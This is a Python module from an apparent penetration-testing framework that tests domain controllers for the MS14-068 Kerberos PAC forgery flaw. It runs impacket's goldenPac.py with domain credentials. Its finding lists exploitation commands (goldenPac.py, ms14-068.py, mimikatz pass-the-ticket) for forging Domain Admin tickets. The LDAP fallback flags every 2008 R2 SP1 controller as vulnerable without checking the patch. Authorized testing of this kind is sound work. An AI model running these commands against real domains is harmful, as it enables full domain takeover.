"""MS14-068 — Kerberos PAC forgery for domain privilege escalation."""
from __future__ import annotations
import asyncio, shutil, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"

class Ms14068(BaseModule):
    NAME = "ms14_068"
    DESCRIPTION = "MS14-068: Kerberos PAC signature forgery — domain-level privilege escalation"
    PHASE = 5
    TAGS = ["attack", "kerberos", "cve-2014-6324"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        dc_ip = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")
        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        if not self.confirm_action(
            action="Test MS14-068 PAC forgery vulnerability",
            target=dc_ip,
            risk="Sends crafted Kerberos requests to test for PAC validation bypass"):
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        username = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        user_sid = self.config.extra.get("user_sid", "")

        if not username or not password:
            self.log.warning("MS14-068 requires valid credentials")
            return self._make_result(start)

        # Check if DC is patched by examining Kerberos behavior
        # MS14-068 works on unpatched DCs by forging PAC with MD5 checksum
        vulnerable = False
        output = ""

        # Method 1: Use impacket goldenPac.py if available
        golden_pac = shutil.which("goldenPac.py")
        if not golden_pac:
            golden_pac = shutil.which("impacket-goldenPac")

        if golden_pac:
            await self.rate_limit()
            try:
                proc = await asyncio.create_subprocess_exec(
                    "python", golden_pac,
                    f"{domain}/{username}:{password}@{dc_ip}",
                    "-no-output",  # Don't execute command, just test
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
                output = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
                if "successfully" in output.lower() or "golden ticket" in output.lower():
                    vulnerable = True
            except Exception:
                pass

        # Method 2: Check DC patch level via LDAP
        if not vulnerable:
            try:
                from adforge.core.ldap_client import LdapClient
                client = LdapClient(dc_ip=dc_ip, domain=domain, username=username, password=password)
                if client.connect():
                    try:
                        await self.rate_limit()
                        # Check hotfixInstalledOn or OS build
                        results = client.search(
                            "(&(objectClass=computer)(dNSHostName=*))",
                            ["operatingSystem", "operatingSystemVersion", "operatingSystemServicePack"],
                            search_base=f"OU=Domain Controllers,{client.base_dn}")
                        for dc in results:
                            os_ver = str(dc.get("operatingSystemVersion", "") or "")
                            sp = str(dc.get("operatingSystemServicePack", "") or "")
                            # Windows Server 2008 R2 SP1 without KB3011780 is vulnerable
                            if "6.1" in os_ver and "Service Pack 1" in sp:
                                vulnerable = True
                                output = f"DC running {dc.get('operatingSystem')} {os_ver} {sp} — potentially unpatched"
                    finally:
                        client.disconnect()
            except Exception:
                pass

        if vulnerable:
            ev = Evidence(response_raw=output[:500], extra={"dc": dc_ip, "domain": domain})
            self.new_finding(
                title=f"MS14-068 — Kerberos PAC Forgery Vulnerable — {dc_ip}",
                severity=Severity.CRITICAL,
                description=(
                    f"DC {dc_ip} appears vulnerable to MS14-068 (CVE-2014-6324).\n\n"
                    "This allows ANY domain user to forge a Kerberos ticket with "
                    "Domain Admin privileges by exploiting weak PAC signature validation. "
                    "The DC accepts MD5 PAC checksums instead of requiring HMAC-MD5.\n\n"
                    "Impact: Complete domain compromise from any domain user account."
                ),
                reproduction_steps=[
                    f"# goldenPac.py (impacket):",
                    f"python goldenPac.py {domain}/{username}:{password}@{dc_ip}",
                    f"# Or: ms14-068.py -u {username}@{domain} -p {password} -s {user_sid} -d {dc_ip}",
                    "# Then: mimikatz kerberos::ptc TGT_user@domain.ccache",
                ],
                remediation="Install KB3011780 immediately. This is a critical patch from 2014.",
                references=["CVE-2014-6324", "MS14-068", "MITRE T1558"],
                evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                mitre_attack=["TA0006/T1558"],
                target=dc_ip)

        return self._make_result(start)

class TestMs14068:
    def test_phase(self) -> None: assert Ms14068.PHASE == 5
